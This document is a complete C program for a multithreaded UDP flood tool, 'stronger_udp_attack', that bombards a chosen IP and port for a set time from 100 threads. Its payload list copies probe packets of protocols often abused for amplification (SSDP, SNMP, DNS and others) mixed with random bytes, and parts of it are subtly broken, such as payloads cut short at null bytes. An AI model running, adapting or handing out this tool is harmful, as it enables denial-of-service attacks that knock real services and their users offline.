#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>

#define MAX_PAYLOADS 100
#define MAX_PAYLOAD_SIZE 150
#define VARIABLE_DELAY_MIN 100
#define VARIABLE_DELAY_MAX 500
#define NUM_THREADS 100

struct thread_data {
    char *ip;
    int port;
    int duration;
    int thread_id;
};

volatile bool stop_attack = false;

void usage() {
    printf("Usage: ./stronger_udp_attack <ip> <port> <duration>\n");
    exit(EXIT_FAILURE);
}

void handle_interrupt(int sig) {
    printf("\nAttack interrupted. Stopping...\n");
    stop_attack = true;
}

void generate_random_payload(char *buffer, size_t size) {
    const char hex_chars[] = "0123456789abcdef";
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = hex_chars[rand() % 16];
        buffer[i * 4 + 3] = hex_chars[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

void generate_payloads(char payloads[MAX_PAYLOADS][MAX_PAYLOAD_SIZE], int *count) {
    const char *static_patterns[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00",
        "\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x01\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
    };
    size_t static_count = sizeof(static_patterns) / sizeof(static_patterns[0]);

    int index = 0;

    for (size_t i = 0; i < static_count && index < MAX_PAYLOADS; i++) {
        strncpy(payloads[index++], static_patterns[i], MAX_PAYLOAD_SIZE);
    }

    for (int i = 0; i < MAX_PAYLOADS - static_count; i++) {
        generate_random_payload(payloads[index++], rand() % 30 + 5);
    }

    *count = index;
}

void *udp_attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in target_addr;
    time_t end_time = time(NULL) + data->duration;

    char payloads[MAX_PAYLOADS][MAX_PAYLOAD_SIZE];
    int payload_count;

    generate_payloads(payloads, &payload_count);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->port);
    target_addr.sin_addr.s_addr = inet_addr(data->ip);

    printf("Thread %d: Sending packets.\n", data->thread_id);

    while (!stop_attack && time(NULL) < end_time) {
        for (int i = 0; i < payload_count && !stop_attack; i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0, 
                       (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                perror("Send failed");
                break;
            }
            usleep(rand() % (VARIABLE_DELAY_MAX - VARIABLE_DELAY_MIN + 1) + VARIABLE_DELAY_MIN);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    srand(time(NULL));

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    signal(SIGINT, handle_interrupt);

    pthread_t thread_ids[NUM_THREADS];
    struct thread_data thread_data_array[NUM_THREADS];

    printf("Starting attack on %s:%d for %d seconds with %d threads\n", ip, port, duration, NUM_THREADS);

    for (int i = 0; i < NUM_THREADS; i++) {
        thread_data_array[i] = (struct thread_data){ip, port, duration, i + 1};

        if (pthread_create(&thread_ids[i], NULL, udp_attack, &thread_data_array[i]) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
        printf("Launched thread %lu (ID: %d)\n", thread_ids[i], i + 1);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}

